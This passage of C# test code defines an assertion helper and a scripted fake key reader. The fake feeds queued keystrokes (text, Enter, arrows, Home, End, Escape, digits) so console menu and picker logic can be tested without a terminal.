        private static void AssertEqual(object expected, object actual, string msg)
        {
            if (!object.Equals(expected, actual))
                throw new Exception(msg + " (expected '" + expected + "', got '" + actual + "')");
        }
    }

    // A scripted key source so menu and picker logic can be driven without a
    // terminal. Throws if it runs dry, so a wrong script fails fast instead of
    // hanging.
    internal class ScriptedKeyReader : IKeyReader
    {
        private readonly Queue<ConsoleKeyInfo> _keys = new Queue<ConsoleKeyInfo>();

        public ScriptedKeyReader Type(string text)
        {
            foreach (char c in text)
                _keys.Enqueue(new ConsoleKeyInfo(c, ConsoleKey.A, false, false, false));
            return this;
        }

        // Type a line and press Enter (for a free-text prompt).
        public ScriptedKeyReader TypeLine(string text)
        {
            Type(text);
            return Enter();
        }

        public ScriptedKeyReader Enter()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\r', ConsoleKey.Enter, false, false, false));
            return this;
        }

        public ScriptedKeyReader Down()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.DownArrow, false, false, false));
            return this;
        }

        public ScriptedKeyReader Up()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.UpArrow, false, false, false));
            return this;
        }

        public ScriptedKeyReader Home()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.Home, false, false, false));
            return this;
        }

        public ScriptedKeyReader End()
        {
            _keys.Enqueue(new ConsoleKeyInfo('\0', ConsoleKey.End, false, false, false));
            return this;
        }

        public ScriptedKeyReader Escape()
        {
            _keys.Enqueue(new ConsoleKeyInfo((char)27, ConsoleKey.Escape, false, false, false));
            return this;
        }

        public ScriptedKeyReader Digit(int n)
        {
            char c = (char)('0' + n);
            ConsoleKey k = (ConsoleKey)((int)ConsoleKey.D0 + n);
            _keys.Enqueue(new ConsoleKeyInfo(c, k, false, false, false));
            return this;
        }

        public ConsoleKeyInfo ReadKey()
        {
            if (_keys.Count == 0)
                throw new InvalidOperationException("scripted key source is empty");
            return _keys.Dequeue();
        }
    }
}
